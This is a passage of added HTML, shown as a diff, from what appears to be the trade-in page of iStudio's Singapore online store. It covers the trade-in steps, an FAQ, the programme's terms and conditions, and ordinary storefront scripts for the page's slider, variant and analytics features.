+                                                            <div class="multicolumn-card__info">
+                                                                <h3 class="inline-richtext"><span
+                                                                        style="text-decoration:underline"><strong>Step
+                                                                            3</strong></span></h3>
+                                                                <div class="rte">
+                                                                    <p>Receive the trade-in value of your device and
+                                                                        immediately apply it towards the purchase of a
+                                                                        new device.</p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                                <div class="slider-buttons no-js-hidden medium-hide">
+                                                    <button type="button" class="slider-button slider-button--prev"
+                                                        name="previous" aria-label="Slide left" disabled>
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                    <div class="slider-counter caption">
+                                                        <span class="slider-counter--current">1</span>
+                                                        <span aria-hidden="true"> / </span>
+                                                        <span class="visually-hidden">of</span>
+                                                        <span class="slider-counter--total">3</span>
+                                                    </div>
+                                                    <button type="button" class="slider-button slider-button--next"
+                                                        name="next" aria-label="Slide right">
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                </div>
+                                            </slider-component>
+                                            <div class="center small-hide medium-hide"></div>
+                                        </div>
+                                    </div>
+
+
+                                </section>
+                                <section id="shopify-section-template--16932308091060__rich_text_BPHJaz"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__rich_text_BPHJaz-padding {
+                                            padding-top: 15px;
+                                            padding-bottom: 15px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__rich_text_BPHJaz-padding {
+                                                padding-top: 20px;
+                                                padding-bottom: 20px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="isolate">
+                                        <div
+                                            class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_BPHJaz-padding">
+                                            <div class="rich-text__wrapper rich-text__wrapper--center page-width">
+                                                <div class="rich-text__blocks left">
+                                                    <div class="rich-text__text rte">
+                                                        <p>Please contact us at <a href="/"><span class="__cf_email__"
+                                                                    data-cfemail="50363535343231333b103329333c3526393f7e333f3d">[email&#160;protected]</span></a>
+                                                            if you have other enquiries. Trade-in program is provided by
+                                                            "Carousell".</p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <style>
+                                        #shopify-section-template--16932308091060__rich_text_BPHJaz .rich-text__blocks {
+                                            max-width: 100%;
+                                        }
+                                    </style>
+                                </section>
+                                <section id="shopify-section-template--16932308091060__collapsible_content_4VL7bw"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/component-accordion.css?v=145071537942940513591717736425"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/collapsible-content.css?v=127502585749033803951717736428"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__collapsible_content_4VL7bw-padding {
+                                            padding-top: 27px;
+                                            padding-bottom: 27px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__collapsible_content_4VL7bw-padding {
+                                                padding-top: 36px;
+                                                padding-bottom: 36px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="color-background-1 gradient">
+                                        <div
+                                            class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
+                                            <div
+                                                class="collapsible-content__wrapper section-template--16932308091060__collapsible_content_4VL7bw-padding">
+                                                <div class="collapsible-content-wrapper-narrow">
+                                                    <div class="collapsible-content__header"
+                                                        style="text-align: center;">
+                                                        <h2 class="collapsible-content__heading inline-richtext h2">
+                                                            <strong>Frequently Asked Questions</strong>
+                                                        </h2>
+                                                    </div>
+                                                    <div
+                                                        class="grid grid--1-col grid--2-col-tablet collapsible-content__grid collapsible-content__grid--reverse">
+                                                        <div class="grid__item">
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            What do I need to bring along?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>You will be required to bring your
+                                                                                charger and cable for laptops.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            What if I do not like the value after
+                                                                            assessment?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>You can choose to not accept the trade-in
+                                                                                value, but the value shown is final.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            Can multiple devices be traded in during the
+                                                                            same transaction?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>Unfortunately, only one device can be
+                                                                                traded in per transaction.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            Do I get to keep the memory card from the
+                                                                            trade-in devices?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>We recommend that you remove and keep all
+                                                                                your memory cards before you trade-in a
+                                                                                device</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            Would I be able to get back my old device
+                                                                            back after the trade-in?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>You would not be able to retrieve your
+                                                                                old device as all trade-ins are final.
+                                                                                Prior to trading in your device, we
+                                                                                recommend backing up all your important
+                                                                                content such as contacts, photos,
+                                                                                videos, etc.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            Can I trade-in my device if it does not
+                                                                            work?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>We would not be able to assess your
+                                                                                device if we are unable to power on your
+                                                                                device.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            What if my device is not found in the
+                                                                            trade-in device list?
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
+                                                                        <div class="accordion__content rte">
+                                                                            <p>You can head down to our stores to get
+                                                                                your device assessed by our iStudio
+                                                                                Experts to check if it is accepted.</p>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                </section>
+                                <section id="shopify-section-template--16932308091060__collapsible_content_e7PxFi"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/component-accordion.css?v=145071537942940513591717736425"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/collapsible-content.css?v=127502585749033803951717736428"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__collapsible_content_e7PxFi-padding {
+                                            padding-top: 21px;
+                                            padding-bottom: 21px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__collapsible_content_e7PxFi-padding {
+                                                padding-top: 28px;
+                                                padding-bottom: 28px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="color-background-1 gradient">
+                                        <div
+                                            class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
+                                            <div
+                                                class="collapsible-content__wrapper section-template--16932308091060__collapsible_content_e7PxFi-padding">
+                                                <div class="collapsible-content-wrapper-narrow">
+                                                    <div class="collapsible-content__header"
+                                                        style="text-align: center;">
+                                                        <h2 class="visually-hidden">Collapsible content</h2>
+
+                                                    </div>
+                                                    <div
+                                                        class="grid grid--1-col grid--2-col-tablet collapsible-content__grid collapsible-content__grid--reverse">
+                                                        <div class="grid__item">
+                                                            <div class="accordion">
+                                                                <details
+                                                                    id="Details-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
+                                                                    <summary
+                                                                        id="Summary-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi"
+                                                                        role="button" aria-expanded="false"
+                                                                        aria-controls="CollapsibleAccordion-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
+
+
+
+                                                                        <h3 class="accordion__title inline-richtext h4">
+                                                                            Terms and Conditions
+                                                                        </h3>
+
+                                                                        <svg aria-hidden="true" focusable="false"
+                                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+
+                                                                    </summary>
+                                                                    <div id="CollapsibleAccordion-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi"
+                                                                        role="region"
+                                                                        aria-labelledby="Summary-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
+                                                                        <div class="accordion__content rte">
+                                                                            <ul>
+                                                                                <li>Customer affirms that s/he is at
+                                                                                    least legally 18 years of age.</li>
+                                                                                <li>"Customer" means the undersigned
+                                                                                    that is the owner of the Product or
+                                                                                    has been authorised by the owner of
+                                                                                    the Product to make decisions on the
+                                                                                    Product.</li>
+                                                                                <li>The Trade-in programme is provided
+                                                                                    to iStudio customers by Laku6 as a
+                                                                                    third party company. Apple is not a
+                                                                                    party in the transaction.</li>
+                                                                                <li>Laku6 and iStudio reserve the right
+                                                                                    to refuse, cancel, or limit the
+                                                                                    programme for any reason and may
+                                                                                    change these terms and conditions at
+                                                                                    any time without prior notice.</li>
+                                                                                <li>The Programme is provided for lawful
+                                                                                    purposes only, to the extent
+                                                                                    permitted by law, Customer agrees to
+                                                                                    indemnify iStudio, Laku6, its
+                                                                                    affiliate and any of its directors,
+                                                                                    officers, employees, affiliates,
+                                                                                    subsidiaries or agents from and
+                                                                                    against claims brought against any
+                                                                                    of them arising from Customer's
+                                                                                    breach of terms and conditions of
+                                                                                    the Programme.</li>
+                                                                                <li>iStudio trade-in programme is only
+                                                                                    available at all iStudio stores
+                                                                                    (excluding Airport Terminal Stores)
+                                                                                </li>
+                                                                                <li>Total trade-in value is not
+                                                                                    transferable.</li>
+                                                                                <li>iStudio reserves the right to refuse
+                                                                                    any customer's eligibility at any
+                                                                                    time in its discretion in the even
+                                                                                    of such customer's breach or
+                                                                                    suspected breach of any of the terms
+                                                                                    and conditions herein without prior
+                                                                                    notification or any liability to
+                                                                                    such customer whatsoever.</li>
+                                                                                <li>iStudio reserves the right to vary
+                                                                                    any term or condition. iStudio will,
+                                                                                    where it is practicable to do so,
+                                                                                    give customers advance notice (which
+                                                                                    may be through written notice,
+                                                                                    electronic mail letters, iStudio
+                                                                                    website, or such other forms as
+                                                                                    iStudio deems appropriate) of such
+                                                                                    changes.</li>
+                                                                                <li>This iStudio Trade-in programme is
+                                                                                    limited to one (1) device per
+                                                                                    eligible trade-in.</li>
+                                                                            </ul>
+                                                                        </div>
+
+
+
+
+
+
+
+
+
+                                                                    </div>
+                                                                </details>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                </section>
+                                <section id="shopify-section-template--16932308091060__rich_text_48PK4h"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__rich_text_48PK4h-padding {
+                                            padding-top: 27px;
+                                            padding-bottom: 0px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__rich_text_48PK4h-padding {
+                                                padding-top: 36px;
+                                                padding-bottom: 0px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="isolate">
+                                        <div
+                                            class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_48PK4h-padding">
+                                            <div class="rich-text__wrapper rich-text__wrapper--center page-width">
+                                                <div class="rich-text__blocks center">
+                                                    <h1 class="rich-text__heading rte inline-richtext h2">
+                                                        Why Shop Online
+                                                    </h1>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                </section>
+                                <section id="shopify-section-template--16932308091060__multicolumn_qrFXUg"
+                                    class="shopify-section multicolumn_sec">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__multicolumn_qrFXUg-padding {
+                                            padding-top: 27px;
+                                            padding-bottom: 27px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__multicolumn_qrFXUg-padding {
+                                                padding-top: 36px;
+                                                padding-bottom: 36px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="multicolumn color-background-1 gradient background-primary no-heading">
+                                        <div
+                                            class="page-width section-template--16932308091060__multicolumn_qrFXUg-padding isolate">
+                                            <slider-component class="slider-mobile-gutter" style="display:block;">
+                                                <ul class="multicolumn-list contains-content-container grid grid--1-col-tablet-down grid--2-col-desktop slider slider--mobile grid--peek"
+                                                    id="Slider-template--16932308091060__multicolumn_qrFXUg"
+                                                    role="list">
+                                                    <li id="Slide-template--16932308091060__multicolumn_qrFXUg-1"
+                                                        class="multicolumn-list__item grid__item slider__slide">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 108px) * 0.5 /  2),
+                      (min-width: 990px) calc((100vw - 108px) * 0.5 / 2),
+                      (min-width: 750px) calc((100vw - 100px) * 0.5 / 1),
+                      calc((100vw - 30px) * 0.5 / 1)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info">
+                                                                <h3 class="inline-richtext">Click &amp; Collect</h3>
+                                                                <div class="rte">
+                                                                    <p>Check the stocks availability, order on the way
+                                                                        and simply pick-up when you reach. </p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_qrFXUg-2"
+                                                        class="multicolumn-list__item grid__item slider__slide">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 108px) * 0.5 /  2),
+                      (min-width: 990px) calc((100vw - 108px) * 0.5 / 2),
+                      (min-width: 750px) calc((100vw - 100px) * 0.5 / 1),
+                      calc((100vw - 30px) * 0.5 / 1)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info">
+                                                                <h3 class="inline-richtext">Local Delivery</h3>
+                                                                <div class="rte">
+                                                                    <p>Enjoy complimentary delivery for orders with a
+                                                                        minimum spend of $250.</p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                                <div class="slider-buttons no-js-hidden medium-hide">
+                                                    <button type="button" class="slider-button slider-button--prev"
+                                                        name="previous" aria-label="Slide left" disabled>
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                    <div class="slider-counter caption">
+                                                        <span class="slider-counter--current">1</span>
+                                                        <span aria-hidden="true"> / </span>
+                                                        <span class="visually-hidden">of</span>
+                                                        <span class="slider-counter--total">2</span>
+                                                    </div>
+                                                    <button type="button" class="slider-button slider-button--next"
+                                                        name="next" aria-label="Slide right">
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                </div>
+                                            </slider-component>
+                                            <div class="center small-hide medium-hide"></div>
+                                        </div>
+                                    </div>
+
+
+                                    <style>
+                                        #shopify-section-template--16932308091060__multicolumn_qrFXUg .multicolumn-card.content-container {
+                                            display: flex;
+                                        }
+
+                                        #shopify-section-template--16932308091060__multicolumn_qrFXUg .multicolumn-card__info {
+                                            text-align: left;
+                                        }
+                                    </style>
+                                </section>
+
+                            </main>
+                        </div>
+                    </div>
+                </modal-dialog>
+                <script data-cfasync="false"
+                    src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+                <script src="//www.istudiosg.com/cdn/shop/t/14/assets/product-modal.js?v=116616134454508949461742784888"
+                    defer="defer"></script>
+                <script src="//www.istudiosg.com/cdn/shop/t/14/assets/media-gallery.js?v=96661908581229995091742784888"
+                    defer="defer"></script>
+                <script>
+                    document.addEventListener('DOMContentLoaded', function () {
+                        function isIE() {
+                            const ua = window.navigator.userAgent;
+                            const msie = ua.indexOf('MSIE ');
+                            const trident = ua.indexOf('Trident/');
+
+                            return msie > 0 || trident > 0;
+                        }
+
+                        if (!isIE()) return;
+                        const hiddenInput = document.querySelector('#product-form-template--17605519376564__main input[name="id"]');
+                        const noScriptInputWrapper = document.createElement('div');
+                        const variantSwitcher =
+                            document.querySelector('variant-radios[data-section="template--17605519376564__main"]') ||
+                            document.querySelector('variant-selects[data-section="template--17605519376564__main"]');
+                        noScriptInputWrapper.innerHTML = document.querySelector(
+                            '.product-form__noscript-wrapper-template--17605519376564__main'
+                        ).textContent;
+                        variantSwitcher.outerHTML = noScriptInputWrapper.outerHTML;
+
+                        document.querySelector('#Variants-template--17605519376564__main').addEventListener('change', function (event) {
+                            hiddenInput.value = event.currentTarget.value;
+                        });
+                    });
+                </script>
+            </section>
+            <style>
+                .slider_media video {
+                    max-width: 100%;
+                }
+            </style>
+            <script>
+                var unavailable_msg = "<div class='unavailableOptionTxt'>Some options have been updated based on availability</div>";
+                var varselect = 'selected';
+                var varunselect = 'unselected';
+                function getMeta(url, elem) {
+                    var img = new Image();
+                    img.src = url;
+                    img.onload = function () {
+                        //var apr = this.width/this.height;
+                        var apr = this.width / this.height;
+                        var calc_padd = (1 / apr) * 100;
+                        calc_padd = calc_padd + '%';
+                        var calc_height = Math.ceil(973 / apr);
+                        elem.attr('height', calc_height);
+                        elem.parent().css('padding-top', calc_padd);
+                    }
+                }
+
+
+                $(document).ready(function () {
+                    //quantity input textbox-server error issue - fix
+                    $("#prodQuantity").keyup("input", function (event) {
+                        if (event.keyCode === 13) {
+                            event.preventDefault();
+                            event.target.blur();
+                        }
+                    });
+                    $("#prodQuantity").on("change", function (event) {
+                        resetErrors();
+                    });
+
+                    var prodList = localStorage.getItem("product-click");
+                    //  localStorage.removeItem("product-click");
+                    var prevPage = document.referrer;
+                    if (prevPage.includes("collections")) {
+                        prevPage = "PLP :: " + formatString(prevPage.split("/")[prevPage.split("/").length - 1]);
+                    } else if (prevPage.includes("pages")) {
+                        prevPage = prevPage.split("/")[prevPage.split("/").length - 1] + "_page";
+                    } else if (prevPage.includes("search")) {
+                        prevPage = "Search Results"
+                    } else if (prevPage.includes("products")) {
+                        var arr = prevPage.split("/");
+                        prevPage = arr[arr.length - 1].split("?")[0] + "_pdp";
+                    } else if (prevPage.includes("cart")) {
+                        var pageName = window.location.href;
